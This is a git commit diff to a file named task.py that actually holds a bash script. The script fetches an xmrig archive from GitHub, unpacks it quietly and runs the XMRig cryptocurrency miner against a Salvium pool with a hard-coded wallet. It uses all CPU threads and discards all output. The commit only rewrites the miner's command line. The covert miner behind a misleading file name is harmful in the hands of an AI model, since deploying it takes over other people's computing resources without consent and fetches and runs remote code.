7a3a38bd79e0fadc50a652d5172421036b359b72
pasteradabin <lucasjovi36@gmail.com>
2025-02-25 23:33:29 +0700

    Update task.py

--- task.py
+++ task.py
@@ -1,6 +1,3 @@
 #!/bin/bash
-A=sg.salvium.herominers.com:1230
-B=SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv
-C=cos
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv -p cos -a rx/0 -t $(nproc --all) >/dev/null 2>&1
